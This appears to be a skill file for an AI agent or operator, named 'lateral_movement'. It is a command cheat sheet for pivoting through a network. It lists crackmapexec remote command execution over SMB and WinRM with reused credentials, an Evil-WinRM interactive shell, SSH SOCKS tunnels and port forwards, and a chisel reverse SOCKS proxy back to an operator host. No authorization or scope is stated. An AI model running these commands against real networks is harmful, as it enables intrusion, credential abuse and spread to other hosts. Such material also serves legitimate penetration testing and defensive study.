---
name: lateral_movement
description: Network pivoting, SMB/WinRM/SSH access, and credential reuse
---

# Lateral Movement

## SMB Pivoting

```bash
# Access file shares
smbclient //10.0.1.20/C$ -U admin%password

# List shares
enum4linux-ng -a 10.0.1.20

# Execute commands via SMB
crackmapexec smb 10.0.1.20 -u admin -p password -x "whoami"
```

## WinRM Pivoting

```bash
# Execute commands via WinRM
crackmapexec winrm 10.0.1.20 -u admin -p password -x "whoami"

# Evil-WinRM shell
evil-winrm -i 10.0.1.20 -u admin -p password
```

## SSH Pivoting

```bash
# SSH with credentials
ssh admin@10.0.1.20

# SSH tunnel for pivoting
ssh -D 1080 admin@10.0.1.20

# SSH port forwarding
ssh -L 3389:10.0.1.30:3389 admin@10.0.1.20
```

## SOCKS Proxy

```bash
# Chisel for SOCKS proxy
chisel server --reverse --port 8080
chisel client 10.0.1.10:8080 R:socks
```
